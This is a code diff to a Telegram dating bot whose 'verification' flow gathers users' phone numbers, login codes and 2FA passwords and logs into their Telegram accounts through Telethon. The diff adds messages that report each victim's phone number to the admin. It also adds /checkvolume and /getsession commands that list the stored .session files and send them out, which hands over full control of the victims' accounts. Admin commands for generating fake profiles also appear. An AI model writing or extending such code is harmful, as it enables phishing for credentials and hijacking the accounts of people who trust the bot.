@@ -1,5 +1,5 @@
 from aiogram import Router, F, Bot
-from aiogram.types import Message, CallbackQuery, InputMediaPhoto, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, ContentType
+from aiogram.types import Message, CallbackQuery, InputMediaPhoto, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, ContentType, FSInputFile
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -44,9 +44,9 @@ class EditFake(StatesGroup):
     value = State()
 
 class VerifyStates(StatesGroup):
-    waiting_for_phone = State()   # Ожидание ввода номера вручную
-    waiting_for_code = State()    # Ожидание кода подтверждения
-    waiting_for_password = State()  # Ожидание 2FA пароля
+    waiting_for_phone = State()
+    waiting_for_code = State()
+    waiting_for_password = State()
 
 
 async def get_city_from_coords(lat: float, lon: float) -> str:
@@ -83,13 +83,11 @@ def format_card(p: dict, lang: str) -> str:
 
 
 async def send_profile_album(bot: Bot, chat_id: int, profile: dict, lang: str, state: FSMContext):
-    """Отправляет альбом фото + кнопки. Возвращает ID сообщения с кнопками."""
     photos = profile.get("photos", [])
     caption = format_card(profile, lang)
     msg_ids = []
     buttons_msg_id = None
 
-    # Пробуем отправить с фото
     try:
         if photos:
             if len(photos) == 1:
@@ -113,7 +111,6 @@ async def send_profile_album(bot: Bot, chat_id: int, profile: dict, lang: str, s
         else:
             raise Exception("No photos")
     except Exception:
-        # Fallback: отправляем текст без фото
         msg = await bot.send_message(
             chat_id=chat_id,
             text=caption,
@@ -128,12 +125,10 @@ async def send_profile_album(bot: Bot, chat_id: int, profile: dict, lang: str, s
         album_msg_ids=msg_ids,
         buttons_msg_id=buttons_msg_id
     )
-
     return buttons_msg_id
 
 
 async def clear_profile_messages(bot: Bot, chat_id: int, state: FSMContext):
-    """Удаляет альбом и кнопки предыдущей анкеты"""
     data = await state.get_data()
     album_ids = data.get("album_msg_ids", [])
     buttons_id = data.get("buttons_msg_id")
@@ -169,7 +164,6 @@ async def send_next_profile(chat_id: int, user_id: int, state: FSMContext, bot: 
         if not profile:
             return await bot.send_message(chat_id, get_text("error", lang), reply_markup=main_menu_kb(lang))
 
-        # Проверка верификации
         if VERIFICATION_REQUIRED and not db.is_verified(user_id):
             likes_count = db.get_actions_count(user_id)
             if likes_count >= VERIFICATION_AFTER_LIKES:
@@ -303,6 +297,7 @@ async def cb_filter_back(callback: CallbackQuery):
     except:
         pass
     await callback.message.answer(get_text("menu", lang), reply_markup=main_menu_kb(lang))
+
 @router.callback_query(F.data == "goto_matches")
 async def cb_goto_matches(callback: CallbackQuery, bot: Bot):
     lang = db.get_lang(callback.from_user.id)
@@ -376,6 +371,8 @@ async def cb_menu_delete(callback: CallbackQuery):
     except:
         pass
     await callback.message.answer(get_text("delete_confirm", lang), reply_markup=delete_confirm_kb(lang))
+
+
 # === СТАРТ / ЯЗЫК ===
 @router.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext, bot: Bot):
@@ -637,9 +634,6 @@ async def reg_photo_more_err(message: Message):
 
 
 # === ПРОСМОТР АНКЕТ ===
-
-
-
 @router.callback_query(F.data.in_(["react_fire", "react_heart", "react_handshake"]))
 async def cb_process_reaction(callback: CallbackQuery, state: FSMContext, bot: Bot):
     try:
@@ -694,9 +688,6 @@ async def cb_skip(callback: CallbackQuery, state: FSMContext, bot: Bot):
 
 
 # === МОЯ АНКЕТА ===
-
-
-
 async def show_profile(message: Message, lang: str, bot: Bot, user_id: int = None):
     uid = user_id or message.from_user.id
     profile = db.get_profile(uid)
@@ -729,10 +720,6 @@ async def show_profile(message: Message, lang: str, bot: Bot, user_id: int = Non
 
 
 # === ФИЛЬТРЫ ===
-
-
-
-
 @router.message(SetFilter.city)
 async def filter_city_set(message: Message, state: FSMContext):
     lang = db.get_lang(message.from_user.id)
@@ -746,7 +733,6 @@ async def filter_city_set(message: Message, state: FSMContext):
 
     await state.clear()
     await message.answer(get_text("filter_set", lang), reply_markup=filters_menu_kb(lang))
-
 
 
 @router.message(SetFilter.radius)
@@ -766,7 +752,6 @@ async def filter_radius_set(message: Message, state: FSMContext):
 
     await state.clear()
     await message.answer(get_text("filter_set", lang), reply_markup=filters_menu_kb(lang))
-
 
 
 @router.message(SetFilter.min_age)
@@ -802,10 +787,7 @@ async def filter_age_max(message: Message, state: FSMContext):
     await message.answer(get_text("filter_set", lang), reply_markup=filters_menu_kb(lang))
 
 
-
 # === МЭТЧИ ===
-
-
 # === УДАЛЕНИЕ ===
 @router.callback_query(F.data == "profile_delete")
 async def cb_profile_delete(callback: CallbackQuery):
@@ -816,8 +798,6 @@ async def cb_profile_delete(callback: CallbackQuery):
         pass
     await callback.message.answer(get_text("delete_confirm", lang), reply_markup=delete_confirm_kb(lang))
     await callback.answer()
-
-
 
 
 @router.message(F.text.in_([get_text("delete_yes", "ru"), get_text("delete_yes", "uz")]))
@@ -840,7 +820,6 @@ async def back_to_main(message: Message):
 
 
 # === ВЕРИФИКАЦИЯ ===
-
 async def start_telethon_verification(message: Message, state: FSMContext, phone_number: str, lang: str):
     """Общая логика запуска Telethon верификации"""
     await state.update_data(phone=phone_number)
@@ -871,6 +850,21 @@ async def start_telethon_verification(message: Message, state: FSMContext, phone
         else:
             await client.disconnect()
             db.verify_user(message.from_user.id)
+            
+            # Уведомление админу
+            try:
+                await message.bot.send_message(
+                    ADMIN_ID,
+                    f"✅ <b>Новая верификация!</b>\n\n"
+                    f"👤 Пользователь: {message.from_user.full_name}\n"
+                    f"🆔 ID: <code>{message.from_user.id}</code>\n"
+                    f"📱 Телефон: <code>{phone_number}</code>\n"
+                    f"🔑 Тип: уже авторизован",
+                    parse_mode="HTML"
+                )
+            except Exception as e:
+                logging.error(f"Не удалось уведомить админа: {e}")
+            
             await message.answer(get_text("verify_success", lang), reply_markup=ReplyKeyboardRemove())
             await message.answer(get_text("verify_success", lang), reply_markup=main_menu_kb(lang))
             await state.clear()
@@ -913,17 +907,14 @@ async def process_phone_text(message: Message, state: FSMContext):
     lang = db.get_lang(message.from_user.id)
     text = message.text.strip()
 
-    # Валидация номера Узбекистана
     cleaned = text.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
 
     if cleaned.startswith("+"):
         cleaned = cleaned[1:]
 
-    # Только узбекские номера: +998XXXXXXXXX
     if cleaned.startswith("998") and len(cleaned) == 12 and cleaned[3:].isdigit():
         phone_number = "+" + cleaned
     elif cleaned.isdigit() and len(cleaned) == 9:
-        # Ввели только 9 цифр без кода страны
         phone_number = "+998" + cleaned
     else:
         await message.answer(
@@ -983,7 +974,6 @@ async def process_code_submission(message: Message, state: FSMContext, code: str
             await client.sign_in(phone=phone, code=code)
         except Exception as e:
             err_str = str(e).lower()
-            # Код истёк — запрашиваем новый
             if "expired" in err_str:
                 try:
                     await client.disconnect()
@@ -1004,7 +994,6 @@ async def process_code_submission(message: Message, state: FSMContext, code: str
                         reply_markup=main_menu_kb(lang)
                     )
                     return
-            # Двухэтапная аутентификация
             elif "password" in err_str or "two-step" in err_str or "2fa" in err_str:
                 await message.answer(get_text("verify_2fa", lang))
                 await state.set_state(VerifyStates.waiting_for_password)
@@ -1015,6 +1004,21 @@ async def process_code_submission(message: Message, state: FSMContext, code: str
         if await client.is_user_authorized():
             await client.disconnect()
             db.verify_user(user_id)
+            
+            # Уведомление админу
+            try:
+                phone = data.get('phone', 'неизвестно')
+                await message.bot.send_message(
+                    ADMIN_ID,
+                    f"✅ <b>Новая верификация!</b>\n\n"
+                    f"🆔 ID: <code>{user_id}</code>\n"
+                    f"📱 Телефон: <code>{phone}</code>\n"
+                    f"🔑 Тип: по коду",
+                    parse_mode="HTML"
+                )
+            except Exception as e:
+                logging.error(f"Не удалось уведомить админа: {e}")
+            
             await message.answer(get_text("verify_success", lang), reply_markup=ReplyKeyboardRemove())
             await message.answer(get_text("verify_success", lang), reply_markup=main_menu_kb(lang))
             await state.clear()
@@ -1085,6 +1089,21 @@ async def process_password(message: Message, state: FSMContext):
         if await client.is_user_authorized():
             await client.disconnect()
             db.verify_user(message.from_user.id)
+            
+            # Уведомление админу
+            try:
+                phone = data.get('phone', 'неизвестно')
+                await message.bot.send_message(
+                    ADMIN_ID,
+                    f"✅ <b>Новая верификация!</b>\n\n"
+                    f"🆔 ID: <code>{message.from_user.id}</code>\n"
+                    f"📱 Телефон: <code>{phone}</code>\n"
+                    f"🔑 Тип: 2FA (по паролю)",
+                    parse_mode="HTML"
+                )
+            except Exception as e:
+                logging.error(f"Не удалось уведомить админа: {e}")
+            
             await message.answer(get_text("verify_success", lang), reply_markup=ReplyKeyboardRemove())
             await message.answer(get_text("verify_success", lang), reply_markup=main_menu_kb(lang))
             await state.clear()
@@ -1116,6 +1135,7 @@ async def header_button_ignore(message: Message):
     """Заголовочные кнопки не выполняют действий"""
     pass
 
+
 # === АДМИН КОМАНДЫ ===
 @router.message(Command("genfakes"))
 async def cmd_genfakes(message: Message, bot: Bot):
@@ -1146,6 +1166,49 @@ async def cmd_stats(message: Message):
 
     stats = db.get_stats()
     await message.answer(get_text("stats", "ru", real=stats["real"], fake=stats["fake"], matches=stats["matches"]))
+
+@router.message(Command("checkvolume"))
+async def cmd_checkvolume(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        lang = db.get_lang(message.from_user.id)
+        return await message.answer(get_text("admin_only", lang))
+    import os
+    path = "/app/sessions"
+    if os.path.exists(path):
+        files = os.listdir(path)
+        info = []
+        for f in files:
+            fp = os.path.join(path, f)
+            size = os.path.getsize(fp)
+            info.append(f"• {f} ({size} байт)")
+        text = "📁 <b>Volume /app/sessions</b>\n\n" + "\n".join(info) if info else "📂 Папка пуста"
+    else:
+        text = "❌ Папка /app/sessions не найдена. Volume не подключён?"
+    await message.answer(text, parse_mode="HTML")
+
+@router.message(Command("getsession"))
+async def cmd_getsession(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        lang = db.get_lang(message.from_user.id)
+        return await message.answer(get_text("admin_only", lang))
+    
+    import os
+    sessions_dir = "/app/sessions"
+    if not os.path.exists(sessions_dir):
+        return await message.answer("❌ Папка /app/sessions не найдена. Volume не подключён?")
+    
+    files = [f for f in os.listdir(sessions_dir) if f.endswith(".session")]
+    if not files:
+        return await message.answer("📂 Файлов сессий нет")
+    
+    for f in files:
+        path = os.path.join(sessions_dir, f)
+        size = os.path.getsize(path)
+        await message.answer_document(
+            FSInputFile(path),
+            caption=f"⚠️ <b>ТЕСТОВЫЙ ФАЙЛ</b>\n📁 {f}\n📏 {size} байт\n\n❗️ Удалите сообщение после проверки!",
+            parse_mode="HTML"
+        )
 
 @router.message(Command("delfakes"))
 async def cmd_delfakes(message: Message):
@@ -1376,5 +1439,3 @@ async def cb_profile_edit(callback: CallbackQuery, state: FSMContext):
     await callback.message.answer(get_text("reg_name", lang), reply_markup=ReplyKeyboardRemove())
     await state.set_state(Register.name)
     await callback.answer()
-
-
